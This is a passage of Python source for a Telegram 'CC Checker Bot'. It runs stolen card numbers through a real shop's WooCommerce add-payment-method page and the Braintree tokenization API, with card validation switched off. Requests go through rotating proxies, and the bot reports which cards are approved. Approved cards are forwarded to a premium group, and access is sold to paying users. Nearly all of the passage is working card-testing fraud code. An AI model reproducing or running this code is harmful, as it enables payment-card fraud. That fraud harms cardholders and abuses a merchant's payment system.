sbjs_first_add=fd%3D2024-07-11%2012%3A15%3A28%7C%7C%7Cep%3Dhttps%3A%2F%2Fsmartshieldsecurity.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F126.0.0.0%20Safari%2F537.36; _gid=GA1.2.831082646.1720701928; _gat_gtag_UA_139285559_1=1; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fsmartshieldsecurity.com%2Fmy-account%2Fadd-payment-method%2F; _ga_FMP1TVZD7N=GS1.1.1720701928.5.1.1720701952.0.0.0; _ga=GA1.1.1142621130.1720161014',
            'origin': 'https://smartshieldsecurity.com',
            'priority': 'u=1, i',
            'referer': 'https://smartshieldsecurity.com/my-account/add-payment-method/',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': user_agent,
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'action': 'wc_braintree_credit_card_get_client_token',
            'nonce': client_token_nonce,
        }

        result = await session.post('https://smartshieldsecurity.com/wp-admin/admin-ajax.php',headers=headers, data=data)

        authorization=result.json()['data']

        decoded_authorization = base64.b64decode(authorization).decode('utf-8')

        data_dict = json.loads(decoded_authorization)

        if data_dict:
            try:
                bearer = data_dict.get('authorizationFingerprint', None)
                # print(bearer)
            except json.JSONDecodeError as e:
                print(f"Error While Bearer Fetching")


        # print(result.text)

       

        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': f'Bearer {bearer}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'priority': 'u=1, i',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': user_agent,
        }

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': '57530c20-caba-490c-8ac5-cd1f553905e1',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mes,
                        'expirationYear': ano,
                        'cvv': cvv,
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        result8 =await session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

        try:
            id = result8.json()['data']['tokenizeCreditCard']['token']
        except:
            return "Bearer Token Expired"
        # print(id)

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            # 'cookie': 'mailchimp_landing_site=https%3A%2F%2Fsmartshieldsecurity.com%2Fmy-account%2Fadd-payment-method%2F; _gid=GA1.2.896933338.1720161014; _fbp=fb.1.1720161013775.664974316436712926; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-07-05%2006%3A00%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fsmartshieldsecurity.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-07-05%2006%3A00%3A14%7C%7C%7Cep%3Dhttps%3A%2F%2Fsmartshieldsecurity.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F126.0.0.0%20Safari%2F537.36; _wpfuuid=8b94c902-d240-474a-8c19-31592e487944; mailchimp.cart.current_email=SRFG@GMAIL.COM; mailchimp_user_email=SRFG%40GMAIL.COM; sucuri_cloudproxy_uuid_e54c5f552=43e722f6cbfc50bec2df6cf465f2721a; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_33ac2e27b0fb75edb77ecc81bae035d4=dghgdhsd%7C1721370778%7Ch6rY8BpsROu12XALn8fmr06KaUwwVITctOo9dO9h9Ae%7Cebce821a80b0d0221203d32dad9e274c6efe50ab091f82cae145e6fd3b3873db; sbjs_session=pgs%3D13%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fsmartshieldsecurity.com%2Fmy-account%2Fadd-payment-method%2F; _gat_gtag_UA_139285559_1=1; _ga_FMP1TVZD7N=GS1.1.1720161013.1.1.1720161456.0.0.0; _ga=GA1.1.1142621130.1720161014',
            'origin': 'https://smartshieldsecurity.com',
            'priority': 'u=0, i',
            'referer': 'https://smartshieldsecurity.com/my-account/add-payment-method/',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user_agent,
        }

        data = {
            'payment_method': 'braintree_credit_card',
            'wc-braintree-credit-card-card-type': 'visa',
            'wc-braintree-credit-card-3d-secure-enabled': '',
            'wc-braintree-credit-card-3d-secure-verified': '',
            'wc-braintree-credit-card-3d-secure-order-total': '0.00',
            'wc_braintree_credit_card_payment_nonce': id,
            'wc_braintree_device_data': '',
            'wc-braintree-credit-card-tokenize-payment-method': 'true',
            'woocommerce-add-payment-method-nonce': paynonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }

        result =await session.post(
            'https://smartshieldsecurity.com/my-account/add-payment-method/',
            # cookies=cookies,
            headers=headers,
            data=data,
            follow_redirects=True
        )
        

        if 'Status code avs: Gateway Rejected: avs'in result.text or'Payment method successfully added.' in result.text or 'Nice! New payment method added' in result.text or 'Duplicate card exists in the vault.' in result.text or 'Status code cvv: Gateway Rejected:' in result.text:
            
                print(f"Approved {fullz}")
                return f"Approved"
        else:
                     soup2 = BeautifulSoup(result.text, 'html.parser')
                     error_ul_tag = soup2.find('ul', class_='woocommerce-error')
                     if error_ul_tag:
                        error_li_tag = error_ul_tag.find('li')
                        if error_li_tag:
                            error_message = error_li_tag.text.strip()
                            reason = error_message.split("Reason:")[1].strip()
                            print(reason)
                            return f"{reason} ðŸš«"
        return f"Declined"
                            

    except Exception as e:
        return 'error'

async def get_bin_info(bin_number):
    try:
        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}")
        data = response.json()
        bin_info = (
    f"🌍 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {data.get('country_name', 'N/A')} {data.get('country_flag', 'N/A')}\n"
    
)


        return bin_info
    except Exception as e:
        return str(e)

async def multi_checking(x, chat_id, message_id):
    start = time.time()
    getproxy = random.choice(open("proxy.txt", "r", encoding="utf-8").read().splitlines())
    proxy_ip, proxy_port, proxy_user, proxy_password = getproxy.split(":")
    proxies = {
        "https://": f"http://{proxy_user}:{proxy_password}@{proxy_ip}:{proxy_port}",
        "http://": f"http://{proxy_user}:{proxy_password}@{proxy_ip}:{proxy_port}",
    }
    async with httpx.AsyncClient(timeout=40, proxies=proxies) as session:
        result = await create_cvv_charge(x, session)
    end = time.time()
    resp = f"{x} - {result} - Taken {round(end - start, 2)}s"
    bot.edit_message_text(resp, chat_id, message_id)
    return result

def create_inline_keyboard(approved, declined, total, current_cc, total_ccs):
    keyboard = types.InlineKeyboardMarkup()
    keyboard.row(
        types.InlineKeyboardButton(f"Approved ✅ : {approved}", callback_data="approved"),
    )
    keyboard.row(
        types.InlineKeyboardButton(f"Declined ❌ : {declined}", callback_data="declined"),
    )
    keyboard.row(
        types.InlineKeyboardButton(f"Total 🚫 : {total}", callback_data="total"),
    )
    keyboard.row(
        types.InlineKeyboardButton(f"Total CCs in File 🚫 : {total_ccs}", callback_data="total_ccs"),
    )
    return keyboard

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if message.from_user.id in AUTHORIZED_USER_IDS or message.from_user.id in premium_users:
        welcome_message = """
👋 **Welcome to CC Checker Bot!** 👋

📜 **How to Use:**
1. **Send `/check <combo>`** - Start checking a CC combo.
2. **Upload a .txt file** - Upload a text file with CC combos to start checking.
3. **/cmd or /cmds** - More Commands Info

💡 *Note:* Only authorized users can access the bot. Contact @Ownerxxxxx for authorization.

🔒 **Stay secure and happy checking!** 🔒
        """
        bot.reply_to(message, welcome_message, parse_mode="Markdown")
    else:
        unauthorized_message = """
🚫 **Access Denied** 🚫

You are not authorized to use this bot. Please contact @Ownerxxxxx for authorization.
        """
        bot.reply_to(message, unauthorized_message, parse_mode="Markdown")
@bot.message_handler(commands=['cmd', 'cmds'])
def send_commands(message):
    commands_text = """
📋*Command List for CC Checker Bot*📋

🔹 */start* or */help* - Get a welcome message and help info.
🔹 */check <combo>* - Start checking a CC combo.
🔹 */stop* - Stop the current checking process.
🔹 */pause* - Pause the current checking process.
🔹 */resume* - Resume the paused checking process.
🔹 *Upload a .txt file* - Upload a text file with CC combos to start checking.

💡 *Note:* Only authorized users can access the bot. Contact @Ownerxxxxx for authorization.
    """
    
    bot.send_message(message.chat.id, commands_text, parse_mode="Markdown")


@bot.message_handler(commands=['check'])
def check_cc(message):
    Thread(target=asyncio.run, args=(_check_cc(message),)).start()

async def _check_cc(message):
    global user_tasks
    if message.from_user.id in AUTHORIZED_USER_IDS or message.from_user.id in premium_users:
        if message.from_user.id in user_tasks and user_tasks[message.from_user.id]['is_running']:
            check_running_message = """
            ⏳ **Check in Progress** ⏳

            A check is already running. Please wait for it to finish or stop it using **/stop**.
            """

            bot.reply_to(message, check_running_message, parse_mode="Markdown")
            return
        try:
            combo = message.text.split('/check ')[1]
            ccs = combo.split('\n')
            user_tasks[message.from_user.id] = {
                'is_running': True,
                'is_paused': False,
                'queue': deque(ccs),
                'approved': [],
                'declined': [],
                'total': 0
            }
            start_check_message = """
            🔄 **Starting CC Check...** 🔄
            """

            msg = bot.reply_to(message, start_check_message, parse_mode="Markdown")


            total_ccs = len(ccs)
            while user_tasks[message.from_user.id]['queue']:
                while user_tasks[message.from_user.id]['is_paused']:
                    await asyncio.sleep(1)
                if not user_tasks[message.from_user.id]['is_running']:
                    break
                current_cc = user_tasks[message.from_user.id]['queue'].popleft()
                user_tasks[message.from_user.id]['total'] += 1
                keyboard = create_inline_keyboard(
                    len(user_tasks[message.from_user.id]['approved']),
                    len(user_tasks[message.from_user.id]['declined']),
                    user_tasks[message.from_user.id]['total'],
                    current_cc,
                    total_ccs
                )
                edit_check_message = f"""
🔍 **Checking:** `{current_cc}`
🚪 **Gate:** **Braintree Auth**
👨‍💻 **Developer:** **@Ownerxxxxx**
                """

                bot.edit_message_text(edit_check_message, message.chat.id, msg.message_id, reply_markup=keyboard, parse_mode="Markdown")

                result = await multi_checking(current_cc, message.chat.id, msg.message_id)
                if 'Approved' in result:
                    user_tasks[message.from_user.id]['approved'].append(current_cc)
                    bot.send_message(
    message.chat.id, 
    f"""
💳 **𝗖𝗖:** `{current_cc}`
🛠 **𝗚𝗮𝘁𝗲:** **Braintree Auth**
📝 **𝗗𝗲𝘁𝗮𝗶𝗹𝘀:** {result}
👨‍💻 **𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿:** @Ownerxxxxx
    """,
    parse_mode="Markdown"
)

                    bot.send_message(
    PREMIUM_GROUP_ID, 
    f"""
💳 **𝗖𝗖:** `{current_cc}`
🛠 **𝗚𝗮𝘁𝗲:** **Braintree Auth**
📝 **𝗗𝗲𝘁𝗮𝗶𝗹𝘀:** {result}
👨‍💻 **𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿:** @Ownerxxxxx
    """,
    parse_mode="Markdown"
)

                else:
                    user_tasks[message.from_user.id]['declined'].append(current_cc)
                status_msg = f"Total: {user_tasks[message.from_user.id]['total']}\nApproved: {len(user_tasks[message.from_user.id]['approved'])}\nDeclined: {len(user_tasks[message.from_user.id]['declined'])}"
                bot.edit_message_text(status_msg, message.chat.id, msg.message_id, reply_markup=keyboard)
            check_completed_message = f"""
            ✅ **Check Completed!** ✅
            {user_tasks[message.from_user.id]['approved']}
            """

            bot.reply_to(message, check_completed_message, parse_mode="Markdown")

        except Exception as e:
            bot.reply_to(message, f"Error: {str(e)}")
        finally:
            user_tasks[message.from_user.id]['is_running'] = False
    else:
        unauthorized_message = """
🚫 **Access Denied** 🚫

You are not authorized to use this bot. Please contact **@Ownerxxxxx** for authorization.
"""

        bot.reply_to(message, unauthorized_message, parse_mode="Markdown")

@bot.message_handler(commands=['stop'])
def stop_checking(message):
    global user_tasks
    if message.from_user.id in AUTHORIZED_USER_IDS or message.from_user.id in premium_users:
        if message.from_user.id in user_tasks and user_tasks[message.from_user.id]['is_running']:
            user_tasks[message.from_user.id]['is_running'] = False
            stop_check_message = """
            🛑 **Stopping the Current Checking Process** 🛑
            """

            bot.reply_to(message, stop_check_message, parse_mode="Markdown")

        else:
            no_check_process_message = """
            🚫 **No Checking Process Running** 🚫
            """

            bot.reply_to(message, no_check_process_message, parse_mode="Markdown")

    else:
        unauthorized_message = """
🚫 **Access Denied** 🚫

You are not authorized to use this bot. Please contact **@Ownerxxxxx** for authorization.
"""

        bot.reply_to(message, unauthorized_message, parse_mode="Markdown")

@bot.message_handler(commands=['pause'])
def pause_checking(message):
    global user_tasks
    if message.from_user.id in AUTHORIZED_USER_IDS or message.from_user.id in premium_users:
        if message.from_user.id in user_tasks and user_tasks[message.from_user.id]['is_running']:
            user_tasks[message.from_user.id]['is_paused'] = True
            pause_check_message = """
            ⏸️ **Pausing the Current Checking Process** ⏸️
            """

            bot.reply_to(message, pause_check_message, parse_mode="Markdown")

        else:
            no_checking_process_message = """
            🚫 **No Checking Process Running** 🚫
            """

            bot.reply_to(message, no_checking_process_message, parse_mode="Markdown")

    else:
        unauthorized_message = """
🚫 **Access Denied** 🚫

You are not authorized to use this bot. Please contact **@Ownerxxxxx** for authorization.
"""

        bot.reply_to(message, unauthorized_message, parse_mode="Markdown")

@bot.message_handler(commands=['resume'])
def resume_checking(message):
    global user_tasks
    if message.from_user.id in AUTHORIZED_USER_IDS or message.from_user.id in premium_users:
        if message.from_user.id in user_tasks and user_tasks[message.from_user.id]['is_running']:
            user_tasks[message.from_user.id]['is_paused'] = False
            resume_check_message = """
            ▶️ **Resuming the Current Checking Process** ▶️
            """

            bot.reply_to(message, resume_check_message, parse_mode="Markdown")

        else:
            no_checking_process_message = """
            🚫 **No Checking Process Running** 🚫
            """

            bot.reply_to(message, no_checking_process_message, parse_mode="Markdown")

    else:
        unauthorized_message = """
🚫 **Access Denied** 🚫

You are not authorized to use this bot. Please contact **@Ownerxxxxx** for authorization.
"""

        bot.reply_to(message, unauthorized_message, parse_mode="Markdown")

@bot.message_handler(commands=['premium'])
def add_premium_user(message):
    if message.from_user.id == OWNER_ID:
        try:
            _, user_id, days = message.text.split()
            user_id = int(user_id)
            days = int(days)
            expiry_date = datetime.now() + timedelta(days=days)
            premium_users[user_id] = expiry_date
            save_premium_users(premium_users)
            premium_user_added_message = f"""
            🌟 **Premium User Added** 🌟

            User **{user_id}** has been added as a premium user for **{days} days**.
            """

            bot.reply_to(message, premium_user_added_message, parse_mode="Markdown")

            premium_access_message = f"""
            🌟 **Premium Access Granted** 🌟

            You have been granted premium access for **{days} days**.
            """

            bot.send_message(user_id, premium_access_message, parse_mode="Markdown")

        except Exception as e:
            bot.reply_to(message, f"Error: {str(e)}")
    else:
        unauthorized_message = """
🚫 **Access Denied** 🚫

You are not authorized to use this bot. Please contact **@Ownerxxxxx** for authorization.
"""

        bot.reply_to(message, unauthorized_message, parse_mode="Markdown")


@bot.message_handler(content_types=['document'])
def handle_docs(message):
    Thread(target=asyncio.run, args=(_handle_docs(message),)).start()

async def _handle_docs(message):
    global user_tasks
    if message.from_user.id in AUTHORIZED_USER_IDS or message.from_user.id in premium_users:
        if message.from_user.id in user_tasks and user_tasks[message.from_user.id]['is_running']:
            check_running_message = """
            ⏳ **Check Already Running** ⏳

            A check is already running. Please wait for it to finish or stop it using **/stop**.
            """

            bot.reply_to(message, check_running_message, parse_mode="Markdown")

            return
        try:
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)

            with open(f"{message.document.file_name}", 'wb') as new_file:
                new_file.write(downloaded_file)

            with open(f"{message.document.file_name}", 'r', encoding='utf-8') as file:
                ccs = file.read().splitlines()

            user_tasks[message.from_user.id] = {
                'is_running': True,
                'is_paused': False,
                'queue': deque(ccs),
                'approved': [],
                'declined': [],
                'total': 0
            }
            start_check_message = """
            🔄 **Starting CC Check...** 🔄
            """

            msg = bot.reply_to(message, start_check_message, parse_mode="Markdown")

            total_ccs = len(ccs)
            while user_tasks[message.from_user.id]['queue']:
                while user_tasks[message.from_user.id]['is_paused']:
                    await asyncio.sleep(1)
                if not user_tasks[message.from_user.id]['is_running']:
                    break
                current_cc = user_tasks[message.from_user.id]['queue'].popleft()
                user_tasks[message.from_user.id]['total'] += 1
                keyboard = create_inline_keyboard(
                    len(user_tasks[message.from_user.id]['approved']),
                    len(user_tasks[message.from_user.id]['declined']),
                    user_tasks[message.from_user.id]['total'],
                    current_cc,
                    total_ccs
                )
                edit_check_message = f"""
🔍 **Checking:** `{current_cc}`
🚪 **Gate:** **Braintree Auth**
👨‍💻 **Developer:** **@Ownerxxxxx**
                """

                bot.edit_message_text(edit_check_message, message.chat.id, msg.message_id, reply_markup=keyboard, parse_mode="Markdown")

                result = await multi_checking(current_cc, message.chat.id, msg.message_id)
                if 'Approved' in result:
                    user_tasks[message.from_user.id]['approved'].append(current_cc)
                    bot.send_message(
    message.chat.id, 
    f"""
💳 **𝗖𝗖:** `{current_cc}`
🛠 **𝗚𝗮𝘁𝗲:** **Braintree Auth**
📝 **𝗗𝗲𝘁𝗮𝗶𝗹𝘀:** {result}
👨‍💻 **𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿:** @Ownerxxxxx
    """,
    parse_mode="Markdown"
)

                    bot.send_message(
    PREMIUM_GROUP_ID, 
    f"""
💳 **𝗖𝗖:** `{current_cc}`
🛠 **𝗚𝗮𝘁𝗲:** **Braintree Auth**
📝 **𝗗𝗲𝘁𝗮𝗶𝗹𝘀:** {result}
👨‍💻 **𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿:** @Ownerxxxxx
    """,
    parse_mode="Markdown"
)

                else:
                    user_tasks[message.from_user.id]['declined'].append(current_cc)
                status_msg = f"Approved: {len(user_tasks[message.from_user.id]['approved'])}\nDeclined: {len(user_tasks[message.from_user.id]['declined'])}\nTotal: {user_tasks[message.from_user.id]['total']}"
                bot.edit_message_text(status_msg, message.chat.id, msg.message_id, reply_markup=keyboard)
            check_completed_message = f"""
            ✅ **Check Completed!** ✅

            **Approved:**
            {user_tasks[message.from_user.id]['approved']}
            """

            bot.reply_to(message, check_completed_message, parse_mode="Markdown")


        except Exception as e:
            bot.reply_to(message, f"Error: {str(e)}")
        finally:
            user_tasks[message.from_user.id]['is_running'] = False
    else:
        unauthorized_message = """
🚫 **Access Denied** 🚫

You are not authorized to use this bot. Please contact **@Ownerxxxxx** for authorization.
"""

        bot.reply_to(message, unauthorized_message, parse_mode="Markdown")


bot.infinity_polling()
